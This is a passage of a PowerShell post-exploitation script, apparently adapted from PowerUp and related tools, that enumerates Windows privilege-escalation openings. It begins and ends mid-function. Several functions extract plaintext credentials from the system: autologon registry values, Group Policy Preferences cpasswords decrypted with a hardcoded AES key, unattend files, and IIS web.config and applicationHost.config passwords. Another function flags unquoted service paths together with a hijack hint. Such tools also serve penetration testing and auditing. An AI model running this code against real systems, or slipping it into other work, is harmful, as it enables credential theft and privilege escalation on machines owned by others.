    .SYNOPSIS
    Gets scheduled tasks binaries and folders with permission  
    #>
    param(
        [string[]]$SkipUser
    )
    $tasks = New-Object System.Collections.ArrayList
    [xml]$tasksXMLobj = $(schtasks.exe /query /xml ONE)
    foreach($task in $tasksXMLobj.Tasks.Task) {
        try{
            $pathname = [System.Environment]::ExpandEnvironmentVariables($task.actions.exec.command).trim()
            $tasks.add($pathname) | Out-Null
        }catch{}
    }
    $tasks = $tasks | where {$_} | Sort-Object -Unique
    if($tasks){
    $list = Get-ModifiablePath $tasks -SkipUser $SkipUser
    }
    if($list.Count -eq 0){
        return "[+] Non Writable Scheduled Task Path Found"
    }else{
        return $list
    }
}
function Get-LocalShares {
    <#
    Modified https://github.com/A-mIn3/WINspect/blob/master/WINspect.ps1
    #>
    $permissionFlags = @{
        0x1 =   "Read-List";
        0x2 =   "Write-Create";
        0x4 =   "Append-Create Subdirectory";                  	
        0x20    =   "Execute file-Traverse directory";
        0x40    =   "Delete child"
        0x10000 =   "Delete";                     
        0x40000 =   "Write access to DACL";
        0x80000 =   "Write Owner"
    }
    $list = New-Object System.Collections.ArrayList
    try{
        Get-WmiObject -class Win32_share -Filter "type=0"| foreach {
            $shareSecurityObj = Get-WmiObject -class Win32_LogicalShareSecuritySetting -Filter "Name='$($_.Name)'"
            $securityDescriptor = $shareSecurityObj.GetSecurityDescriptor().Descriptor
            ForEach($ace in $securityDescriptor.dacl){
                # 0 = Allow ; 1 = Deny
                if([int]$ace.acetype -eq 0){
                    $accessMask  = $ace.accessmask
                    $permissions = ""
                    foreach($flag in $permissionFlags.Keys){
                        if($flag -band $accessMask){
                            $permissions+=$permissionFlags[$flag]
                            $permissions+=", "
                        }
                    }
                    $share = New-Object  PSObject -Property @{
                        ShareName   =  $_.Name     
                        Trustee     =  $ace.trustee.Name 
                        Permissions =  $permissions
                    }
                    $list.add($share) | Out-Null
                }
            }    
        }
    }catch{
        return "[-] $($_.Exception.Message)"
    }
    if($list.Count -gt 0){
        return $list
    }else{
        return "[+] No non-standard local shares found"
    }
}
function Get-UACLevel {
    <#
    https://github.com/A-mIn3/WINspect/blob/master/WINspect.ps1
    .SYNOPSIS
    Checks current configuration of User Account Control
    .DESCRIPTION
    This functions inspects registry informations related to UAC configuration 
    and checks whether UAC is enabled and which level of operation is used.
    #>
    $UACRegValues = Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
    if ([int]$UACRegValues.EnableLUA -eq 1) {
        Write-Output "[+] UAC is enabled"
    }
    else {
        Write-Output "[-] UAC is disabled"
    }
    $consentPrompt = $UACregValues.ConsentPromptBehaviorAdmin
    $secureDesktop = $UACregValues.PromptOnSecureDesktop
    if ( $consentPrompt -eq 0 -and $secureDesktop -eq 0) {
        Write-Output "[*] UAC Level : Never Notify"
    }
    elseif ($consentPrompt -eq 5 -and $secureDesktop -eq 0) {
        Write-Output "[*] UAC Level : Notify only when apps try to make changes (No secure desktop)"
    }
    elseif ($consentPrompt -eq 5 -and $secureDesktop -eq 1) {
        Write-Output "[*] UAC Level : Notify only when apps try to make changes (secure desktop on)"
    }
    elseif ($consentPrompt -eq 5 -and $secureDesktop -eq 2) {
        Write-Output "[*] UAC Level : Always Notify with secure desktop"
    }
}
function Get-RegistryAutoLogon {
    <#
    .SYNOPSIS
    Finds any autologon credentials left in the registry.
    Author: Will Schroeder (@harmj0y)  
    License: BSD 3-Clause  
    Required Dependencies: None  
    .DESCRIPTION
    Checks if any autologon accounts/credentials are set in a number of registry locations.
    If they are, the credentials are extracted and returned as a custom PSObject.
    .EXAMPLE
    Get-RegistryAutoLogon
    Finds any autologon credentials left in the registry.
    .OUTPUTS
    PowerUp.RegistryAutoLogon
    Custom PSObject containing autologin credentials found in the registry.
    .LINK
    https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/windows_autologin.rb
    #>
    
    [OutputType('PowerUp.RegistryAutoLogon')]
    [CmdletBinding()]
    Param()

    $AutoAdminLogon = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)
    Write-Verbose "AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)"

    if ($AutoAdminLogon -and ($AutoAdminLogon.AutoAdminLogon -ne 0)) {

        $DefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
        $DefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
        $DefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
        $AltDefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
        $AltDefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
        $AltDefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword

        if ($DefaultUserName -or $AltDefaultUserName) {
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'DefaultDomainName' $DefaultDomainName
            $Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
            $Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
            $Out | Add-Member Noteproperty 'AltDefaultDomainName' $AltDefaultDomainName
            $Out | Add-Member Noteproperty 'AltDefaultUserName' $AltDefaultUserName
            $Out | Add-Member Noteproperty 'AltDefaultPassword' $AltDefaultPassword
            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.RegistryAutoLogon')
            $Out
        }
    }
}
function Get-CachedGPPPassword {
    <#
    .SYNOPSIS
    Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences and
    left in cached files on the host.
    Author: Chris Campbell (@obscuresec)  
    License: BSD 3-Clause  
    Required Dependencies: None  
    .DESCRIPTION
    Get-CachedGPPPassword searches the local machine for cached for groups.xml, scheduledtasks.xml, services.xml and
    datasources.xml files and returns plaintext passwords.
    .EXAMPLE
    Get-CachedGPPPassword
    NewName   : [BLANK]
    Changed   : {2013-04-25 18:36:07}
    Passwords : {Super!!!Password}
    UserNames : {SuperSecretBackdoor}
    File      : C:\ProgramData\Microsoft\Group Policy\History\{32C4C89F-7
                C3A-4227-A61D-8EF72B5B9E42}\Machine\Preferences\Groups\Gr
                oups.xml
    .LINK
    http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
    https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
    https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb
    http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
    http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
    #>
    [CmdletBinding()]
    Param()
    # Some XML issues between versions
    Set-StrictMode -Version 2
    # make sure the appropriate assemblies are loaded
    Add-Type -Assembly System.Security
    Add-Type -Assembly System.Core
    # helper that decodes and decrypts password
    function local:Get-DecryptedCpassword {
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
        [CmdletBinding()]
        Param(
            [string] $Cpassword
        )
        try {
            # Append appropriate padding based on string length
            $Mod = ($Cpassword.length % 4)
            switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
            }
            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            # Create a new AES .NET Crypto Object
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            # Set IV to all nulls to prevent dynamic generation of IV value
            $AesIV = New-Object Byte[]($AesObject.IV.Length)
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor()
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        }
        catch {
            Write-Error $Error[0]
        }
    }
    # helper that parses fields from the found xml preference files
    function local:Get-GPPInnerField {
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
        [CmdletBinding()]
        Param(
            $File
        )
        try {
            $Filename = Split-Path $File -Leaf
            [XML] $Xml = Get-Content ($File)
            $Cpassword = @()
            $UserName = @()
            $NewName = @()
            $Changed = @()
            $Password = @()
            # check for password field
            if ($Xml.innerxml -like "*cpassword*"){
                Write-Verbose "Potential password in $File"
                switch ($Filename) {
                    'Groups.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'Services.xml' {
                        $Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'Scheduledtasks.xml' {
                        $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'DataSources.xml' {
                        $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'Printers.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'Drives.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                }
           }
           ForEach ($Pass in $Cpassword) {
               Write-Verbose "Decrypting $Pass"
               $DecryptedPassword = Get-DecryptedCpassword $Pass
               Write-Verbose "Decrypted a password of $DecryptedPassword"
               #append any new passwords to array
               $Password += , $DecryptedPassword
           }
            # put [BLANK] in variables
            if (-not $Password) {$Password = '[BLANK]'}
            if (-not $UserName) {$UserName = '[BLANK]'}
            if (-not $Changed)  {$Changed = '[BLANK]'}
            if (-not $NewName)  {$NewName = '[BLANK]'}
            # Create custom object to output results
            $ObjectProperties = @{'Passwords' = $Password;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}
            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Verbose "The password is between {} and may be more than one value."
            if ($ResultsObject) { Return $ResultsObject }
        }
        catch {Write-Error $Error[0]}
    }
    try {
        $AllUsers = $Env:ALLUSERSPROFILE
        if ($AllUsers -notmatch 'ProgramData') {
            $AllUsers = "$AllUsers\Application Data"
        }
        # discover any locally cached GPP .xml files
        $XMlFiles = Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue
        if ( -not $XMlFiles ) {
            Write-Verbose 'No preference files found.'
        }
        else {
            Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
            ForEach ($File in $XMLFiles) {
                Get-GppInnerField $File.Fullname
            }
        }
    }
    catch {
        Write-Error $Error[0]
    }
}
function Get-UnattendedInstallFile {
    <#
    .SYNOPSIS
    Checks several locations for remaining unattended installation files,
    which may have deployment credentials.
    Author: Will Schroeder (@harmj0y)  
    License: BSD 3-Clause  
    Required Dependencies: None  
    .EXAMPLE
    Get-UnattendedInstallFile
    Finds any remaining unattended installation files.
    .LINK
    http://www.fuzzysecurity.com/tutorials/16.html
    .OUTPUTS
    PowerUp.UnattendedInstallFile
    Custom PSObject containing results.
    #>
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.UnattendedInstallFile')]
    [CmdletBinding()]
    Param()
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"
    $SearchLocations = @(   "c:\sysprep\sysprep.xml",
                            "c:\sysprep\sysprep.inf",
                            "c:\sysprep.inf",
                            (Join-Path $Env:WinDir "\Panther\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\Panther\unattend.xml")
                        )
    # test the existence of each path and return anything found
    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'UnattendPath' $_
        $Out | Add-Member Aliasproperty Name UnattendPath
        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.UnattendedInstallFile')
        $Out
    }
    $ErrorActionPreference = $OrigError
}
function Get-UnquotedService {
    <#
    .SYNOPSIS
    Returns the name and binary path for services with unquoted paths
    that also have a space in the name.
    Author: Will Schroeder (@harmj0y)  
    License: BSD 3-Clause  
    Required Dependencies: Get-ModifiablePath, Test-ServiceDaclPermission  
    .DESCRIPTION
    Uses Get-WmiObject to query all win32_service objects and extract out
    the binary pathname for each. Then checks if any binary paths have a space
    and aren't quoted.
    .EXAMPLE
    Get-UnquotedService
    Get a set of potentially exploitable services.
    .OUTPUTS
    PowerUp.UnquotedService
    .LINK
    https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/trusted_service_path.rb
    #>
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.UnquotedService')]
    [CmdletBinding()]
    Param(
        [string[]]$SkipUser
    )
    # find all paths to service .exe's that have a space in the path and aren't quoted
    $VulnServices = Get-WmiObject -Class win32_service | Where-Object {
        $_ -and ($Null -ne $_.pathname) -and ($_.pathname.Trim() -ne '') -and (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'")) -and ($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf('.exe') + 4)) -match '.* .*'
    }
    if ($VulnServices) {
        ForEach ($Service in $VulnServices) {
            $SplitPathArray = $Service.pathname.Split(' ')
            $ConcatPathArray = @()
            for ($i=0;$i -lt $SplitPathArray.Count; $i++) {
                        $ConcatPathArray += $SplitPathArray[0..$i] -join ' '
            }
            $ModifiableFiles = $ConcatPathArray | Get-ModifiablePath -SkipUser $SkipUser
            $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                $Out | Add-Member Noteproperty 'Path' $Service.pathname
                $Out | Add-Member Noteproperty 'ModifiablePath' $_
                $Out | Add-Member Noteproperty 'StartName' $Service.startname
                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -Name '$($Service.name)' -Path <HijackPath>"
                $Out | Add-Member Aliasproperty Name ServiceName
                $Out | Add-Member Noteproperty 'Trustee' $_.IdentityReference
                $Out.PSObject.TypeNames.Insert(0, 'PowerUp.UnquotedService')
                $Out
            }
        }
    }
}
function Get-RegistryAlwaysInstallElevated {
    <#
    .SYNOPSIS
    Checks if any of the AlwaysInstallElevated registry keys are set.
    Author: Will Schroeder (@harmj0y)  
    License: BSD 3-Clause  
    Required Dependencies: None  
    .DESCRIPTION
    Returns $True if the HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
    or the HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated keys
    are set, $False otherwise. If one of these keys are set, then all .MSI files run with
    elevated permissions, regardless of current user permissions.
    .EXAMPLE
    Get-RegistryAlwaysInstallElevated
    Returns $True if any of the AlwaysInstallElevated registry keys are set.
    .OUTPUTS
    System.Boolean
    $True if RegistryAlwaysInstallElevated is set, $False otherwise.
    #>
    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param()
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'
    if (Test-Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer') {
        $HKLMval = (Get-ItemProperty -Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
        Write-Verbose "HKLMval: $($HKLMval.AlwaysInstallElevated)"
        if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){
            $HKCUval = (Get-ItemProperty -Path 'HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
            Write-Verbose "HKCUval: $($HKCUval.AlwaysInstallElevated)"
            if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
                Write-Verbose 'AlwaysInstallElevated enabled on this machine!'
                $True
            }
            else{
                Write-Verbose 'AlwaysInstallElevated not enabled on this machine.'
                $False
            }
        }
        else{
            Write-Verbose 'AlwaysInstallElevated not enabled on this machine.'
            $False
        }
    }
    else{
        Write-Verbose 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer does not exist'
        $False
    }
    $ErrorActionPreference = $OrigError
}
function Get-WebConfig {
    <#
    .SYNOPSIS
    This script will recover cleartext and encrypted connection strings from all web.config
    files on the system. Also, it will decrypt them if needed.
    Author: Scott Sutherland, Antti Rantasaari  
    License: BSD 3-Clause  
    Required Dependencies: None  
    .DESCRIPTION
    This script will identify all of the web.config files on the system and recover the
    connection strings used to support authentication to backend databases.  If needed, the
    script will also decrypt the connection strings on the fly.  The output supports the
    pipeline which can be used to convert all of the results into a pretty table by piping
    to format-table.
    .EXAMPLE
    Return a list of cleartext and decrypted connect strings from web.config files.
    Get-WebConfig
    user   : s1admin
    pass   : s1password
    dbserv : 192.168.1.103\server1
    vdir   : C:\test2
    path   : C:\test2\web.config
    encr   : No
    user   : s1user
    pass   : s1password
    dbserv : 192.168.1.103\server1
    vdir   : C:\inetpub\wwwroot
    path   : C:\inetpub\wwwroot\web.config
    encr   : Yes
    .EXAMPLE
    Return a list of clear text and decrypted connect strings from web.config files.
    Get-WebConfig | Format-Table -Autosize
    user    pass       dbserv                vdir               path                          encr
    ----    ----       ------                ----               ----                          ----
    s1admin s1password 192.168.1.101\server1 C:\App1            C:\App1\web.config            No
    s1user  s1password 192.168.1.101\server1 C:\inetpub\wwwroot C:\inetpub\wwwroot\web.config No
    s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\test\web.config       No
    s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\web.config            Yes
    s3user  s3password 192.168.1.103\server3 D:\App3            D:\App3\web.config            No
    .OUTPUTS
    System.Boolean
    System.Data.DataTable
    .LINK
    https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
    http://www.netspi.com
    https://raw2.github.com/NetSPI/cmdsql/master/cmdsql.aspx
    http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
    http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx
    .NOTES
    Below is an alterantive method for grabbing connection strings, but it doesn't support decryption.
    for /f "tokens=*" %i in ('%systemroot%\system32\inetsrv\appcmd.exe list sites /text:name') do %systemroot%\system32\inetsrv\appcmd.exe list config "%i" -section:connectionstrings
    Author: Scott Sutherland - 2014, NetSPI
    Author: Antti Rantasaari - 2014, NetSPI
    #>
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
    [OutputType('System.Boolean')]
    [OutputType('System.Data.DataTable')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\InetSRV\appcmd.exe")) {

        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add('user')
        $Null = $DataTable.Columns.Add('pass')
        $Null = $DataTable.Columns.Add('dbserv')
        $Null = $DataTable.Columns.Add('vdir')
        $Null = $DataTable.Columns.Add('path')
        $Null = $DataTable.Columns.Add('encr')

        # Get list of virtual directories in IIS
        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath |
        ForEach-Object {

            $CurrentVdir = $_

            # Converts CMD style env vars (%) to powershell env vars (env)
            if ($_ -like "*%*") {
                $EnvarName = "`$Env:"+$_.split("%")[1]
                $EnvarValue = Invoke-Expression $EnvarName
                $RestofPath = $_.split('%')[2]
                $CurrentVdir  = $EnvarValue+$RestofPath
            }

            # Search for web.config files in each virtual directory
            $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | ForEach-Object {

                # Set web.config path
                $CurrentPath = $_.fullname

                # Read the data from the web.config xml file
                [xml]$ConfigFile = Get-Content $_.fullname

                # Check if the connectionStrings are encrypted
                if ($ConfigFile.configuration.connectionStrings.add) {

                    # Foreach connection string add to data table
                    $ConfigFile.configuration.connectionStrings.add|
                    ForEach-Object {

                        [String]$MyConString = $_.connectionString
                        if ($MyConString -like '*password*') {
                            $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
                            $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
                            $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
                            $ConfVdir = $CurrentVdir
                            $ConfEnc = 'No'
                            $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
                        }
                    }
                }
                else {

                    # Find newest version of aspnet_regiis.exe to use (it works with older versions)
                    $AspnetRegiisPath = Get-ChildItem -Path "$Env:SystemRoot\Microsoft.NET\Framework\" -Recurse -filter 'aspnet_regiis.exe'  | Sort-Object -Descending | Select-Object fullname -First 1

                    # Check if aspnet_regiis.exe exists
                    if (Test-Path  ($AspnetRegiisPath.FullName)) {

                        # Setup path for temp web.config to the current user's temp dir
                        $WebConfigPath = (Get-Item $Env:temp).FullName + '\web.config'

                        # Remove existing temp web.config
                        if (Test-Path  ($WebConfigPath)) {
                            Remove-Item $WebConfigPath
                        }

                        # Copy web.config from vdir to user temp for decryption
                        Copy-Item $CurrentPath $WebConfigPath

                        # Decrypt web.config in user temp
                        $AspnetRegiisCmd = $AspnetRegiisPath.fullname+' -pdf "connectionStrings" (get-item $Env:temp).FullName'
                        $Null = Invoke-Expression $AspnetRegiisCmd

                        # Read the data from the web.config in temp
                        [xml]$TMPConfigFile = Get-Content $WebConfigPath

                        # Check if the connectionStrings are still encrypted
                        if ($TMPConfigFile.configuration.connectionStrings.add) {

                            # Foreach connection string add to data table
                            $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {

                                [String]$MyConString = $_.connectionString
                                if ($MyConString -like '*password*') {
                                    $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
                                    $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
                                    $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
                                    $ConfVdir = $CurrentVdir
                                    $ConfEnc = 'Yes'
                                    $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
                                }
                            }
                        }
                        else {
                            Write-Verbose "Decryption of $CurrentPath failed."
                            $False
                        }
                    }
                    else {
                        Write-Verbose 'aspnet_regiis.exe does not exist in the default location.'
                        $False
                    }
                }
            }
        }

        # Check if any connection strings were found
        if ( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable | Sort-Object user,pass,dbserv,vdir,path,encr | Select-Object user,pass,dbserv,vdir,path,encr -Unique
        }
        else {
            Write-Verbose 'No connection strings found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
function Get-ApplicationHost {
    <#
    .SYNOPSIS
    Recovers encrypted application pool and virtual directory passwords from the applicationHost.config on the system.
    Author: Scott Sutherland  
    License: BSD 3-Clause  
    Required Dependencies: None  
    .DESCRIPTION
    This script will decrypt and recover application pool and virtual directory passwords
    from the applicationHost.config file on the system.  The output supports the
    pipeline which can be used to convert all of the results into a pretty table by piping
    to format-table.
    .EXAMPLE
    Return application pool and virtual directory passwords from the applicationHost.config on the system.
    Get-ApplicationHost
    user    : PoolUser1
    pass    : PoolParty1!
    type    : Application Pool
    vdir    : NA
    apppool : ApplicationPool1
    user    : PoolUser2
    pass    : PoolParty2!
    type    : Application Pool
    vdir    : NA
    apppool : ApplicationPool2
    user    : VdirUser1
    pass    : VdirPassword1!
    type    : Virtual Directory
    vdir    : site1/vdir1/
    apppool : NA
    user    : VdirUser2
    pass    : VdirPassword2!
    type    : Virtual Directory
    vdir    : site2/
    apppool : NA
    .EXAMPLE
    Return a list of cleartext and decrypted connect strings from web.config files.
    Get-ApplicationHost | Format-Table -Autosize
    user          pass               type              vdir         apppool
    ----          ----               ----              ----         -------
    PoolUser1     PoolParty1!       Application Pool   NA           ApplicationPool1
    PoolUser2     PoolParty2!       Application Pool   NA           ApplicationPool2
    VdirUser1     VdirPassword1!    Virtual Directory  site1/vdir1/ NA
    VdirUser2     VdirPassword2!    Virtual Directory  site2/       NA
    .OUTPUTS
    System.Data.DataTable
    System.Boolean
    .LINK
    https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
    http://www.netspi.com
    http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
    http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx
    .NOTES
    Author: Scott Sutherland - 2014, NetSPI
    Version: Get-ApplicationHost v1.0
    Comments: Should work on IIS 6 and Above
    #>
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
    [OutputType('System.Data.DataTable')]
    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add('user')
        $Null = $DataTable.Columns.Add('pass')
        $Null = $DataTable.Columns.Add('type')
        $Null = $DataTable.Columns.Add('vdir')
        $Null = $DataTable.Columns.Add('apppool')

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
